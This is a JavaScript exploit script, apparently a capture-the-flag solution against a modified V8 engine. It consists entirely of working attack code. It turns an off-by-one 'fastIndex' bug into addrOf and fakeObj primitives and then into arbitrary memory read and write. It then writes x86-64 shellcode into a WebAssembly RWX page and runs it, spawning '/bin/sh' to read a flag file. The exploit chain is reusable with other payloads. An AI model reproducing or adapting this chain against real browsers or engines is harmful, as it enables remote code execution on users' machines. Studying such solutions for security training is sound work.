/*******************************************************************************
 *                               NorzhCTF 2021
 *                              V12 (V8 exploit)
 *                                                                        myr463
 ******************************************************************************/

/*
 * Shellcode: execve `/bin/sh -c "cat /flag.txt"`
 */

var SHELLCODE = [0x31481eeb, 0xc28948c0, 0x525f3bb0, 0x0b778d48,
                 0xee834856, 0x83495603, 0x485608ea, 0x050fe689,
                 0xffffdde8, 0x69622fff, 0x68732f6e, 0x00632d00,
                 0x20746163, 0x616c662f, 0x78742e67, 0x00000074];



/*
 * Consts
 */

var ARRAYBUFFER_BACKINGSTORE_OFFSET = 0x1cn;
var WASM_PAGE_OFFSET                = 0x68n;



/*
 * Utils
 */

var arrBuf = new ArrayBuffer(8);
var f64Buf = new Float64Array(arrBuf);
var u64Buf = new Uint32Array(arrBuf);

function fl2bint(v)
{
        f64Buf[0] = v;
        return BigInt(u64Buf[0]) + (BigInt(u64Buf[1]) << 32n);
}

function bint2fl(v)
{
        u64Buf[0] = Number(v & 0xffffffffn);
        u64Buf[1] = Number(v >> 32n);
        return f64Buf[0];
}



/*
 * Off-by-one vulnerabilities
 */

function fastIndexOffByOneRead(arr)
{
        return arr.fastIndex(arr.length);
}

function fastIndexOffByOneWrite(arr, v)
{
        return arr.fastIndex(arr.length, v);
}



/*
 * Basic primitives
 */

var arrFloat    = [1.1];
var arrFloatMap = fl2bint(fastIndexOffByOneRead(arrFloat));
var arrObjMap   = arrFloatMap + 0x50n;

function addrOf(obj)
{
        fastIndexOffByOneWrite(arrFloat, bint2fl(arrObjMap));
        arrFloat[0] = obj;
        fastIndexOffByOneWrite(arrFloat, bint2fl(arrFloatMap));

        return fl2bint(arrFloat[0]) & 0xffffffffn;
}

function fakeObj(addr)
{
        arrFloat[0] = bint2fl(addr);
        fastIndexOffByOneWrite(arrFloat, bint2fl(arrObjMap));

        let fake = arrFloat[0];

        fastIndexOffByOneWrite(arrFloat, bint2fl(arrFloatMap));

        return fake;
}



/*
 * Arbitrary READ & WRITE primitives
 */

var arrFloatFake = [bint2fl(arrFloatMap), 1.1, 2.2, 3.3];
var fake         = fakeObj(addrOf(arrFloatFake) - 0x20n);

function arbitraryRead(addr)
{
        if (addr % 2n == 0) {
                addr += 1n;
        }

        arrFloatFake[1] = bint2fl((2n << 32n) + addr - 8n);
        return fake[0];
}

function arbitraryWrite(addr, v)
{
        if (addr % 2n == 0) {
                addr += 1n;
        }

        arrFloatFake[1] = bint2fl((2n << 32n) + addr - 8n);
        fake[0] = bint2fl(BigInt(v));
}



/*
 * Exploit with RWX page
 */

var wasmCode = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
                               0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
                               0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
                               0x00, 0x01, 0x00, 0x04, 0x84, 0x80, 0x80, 0x80,
                               0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83, 0x80,
                               0x80, 0x80, 0x00, 0x01, 0x00, 0x01, 0x06, 0x81,
                               0x80, 0x80, 0x80, 0x00, 0x00, 0x07, 0x91, 0x80,
                               0x80, 0x80, 0x00, 0x02, 0x06, 0x6d, 0x65, 0x6d,
                               0x6f, 0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61,
                               0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a, 0x80, 0x80,
                               0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00,
                               0x00, 0x41, 0x00, 0x0b]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var wasmFunc = wasmInstance.exports.main;

var pageRWXAddr = fl2bint(arbitraryRead(addrOf(wasmInstance) +
                                               WASM_PAGE_OFFSET));
console.log("[*] Found address of RWX page: 0x" + pageRWXAddr.toString(16));

function copyShellcode(addr, shellcode)
{
        let buf                 = new ArrayBuffer(0x100);
        let dataView            = new DataView(buf);
        let bufAddr             = addrOf(buf);
        let backingStoreAddr    = bufAddr + ARRAYBUFFER_BACKINGSTORE_OFFSET;

        arbitraryWrite(backingStoreAddr, addr);

        for (let i = 0; i < shellcode.length; ++i) {
                dataView.setUint32(4 * i, shellcode[i], true);
        }
}
console.log("[+] Copying shellcode to RWX page");
copyShellcode(pageRWXAddr, SHELLCODE);

console.log("[+] Executing shellcode...");
wasmFunc();
